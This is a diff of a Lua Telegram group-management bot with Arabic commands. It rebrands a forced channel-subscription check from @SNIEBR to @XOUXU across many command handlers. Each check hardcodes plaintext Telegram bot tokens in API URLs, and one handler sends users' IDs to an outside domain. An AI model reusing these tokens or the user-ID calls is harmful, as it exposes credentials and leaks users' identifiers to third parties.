+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBRTEAM')..')\n'
@@ -3375,10 +3385,10 @@ getUser(msg.sender_user_id_, TSby)
 end
 ------------------------------------------------------------------------
 if text == "تعطيل" then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBRTEAM')..')\n'
@@ -3442,7 +3452,7 @@ if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ then
 local res = https.request('https://SNIEBR.gq/SNIEBR.php?id='..msg.sender_user_id_..'')
 if res then
 if res == 'false' then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 
 return false end
 
@@ -3465,10 +3475,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع منشئ اساسي @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع منشئ اساسي) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3488,10 +3498,10 @@ resolve_username(apmd[2],promote_by_username)
 return false
 end
 if text and text:match("^رفع منشئ اساسي (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع منشئ اساسي) (%d+)$")}
 datahmade:sadd('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
@@ -3499,10 +3509,10 @@ tsX000(apmd[2],msg,"🔖┇تم رفعة منشئ اساسي  في البوت")
 return false
 end
 if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
 datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
@@ -3512,10 +3522,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^تنزيل منشئ اساسي @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(تنزيل منشئ اساسي) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3531,10 +3541,10 @@ resolve_username(apmd[2],promote_by_username)
 return false
 end
 if text and text:match("^تنزيل منشئ اساسي (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(تنزيل منشئ اساسي) (%d+)$")}
 datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
@@ -3571,10 +3581,10 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^مغادره (-%d+)$")  then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local txt = {string.match(text, "^(مغادره) (-%d+)$")}
 send(msg.chat_id_, msg.id_, 1, '📮┇المجموعه {'..txt[2]..'} تم الخروج منها', 1, 'md')
@@ -3583,10 +3593,10 @@ chat_leave(txt[2], bot_id)
 end
 ------------------------------------------------------------------------
 if text and text:match('^المده1 (-%d+)$')  then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local txt = {string.match(text, "^(المده1) (-%d+)$")}
 local keko_info = nil
@@ -3671,10 +3681,10 @@ end -- if is_sudo(msg) then
 ------------------------------------------------------------------------
 if is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) and ChekAdd(msg.chat_id_) == true then    
 if text == "رفع منشئ" and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function setcreator_by_reply(extra, result, success)
 local hash =  'SNIEBR:'..bot_id..'creator:'..msg.chat_id_
@@ -3689,10 +3699,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,setcreator_by_reply)
 end
 if text and text:match("^رفع منشئ @(.*)$") then
 local apow = {string.match(text, "^(رفع منشئ) @(.*)$")}
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function setcreator_by_username(extra, result, success)
 if result.id_ then
@@ -3712,10 +3722,10 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^رفع منشئ (%d+)$") then
 local apow = {string.match(text, "^(رفع منشئ) (%d+)$")}
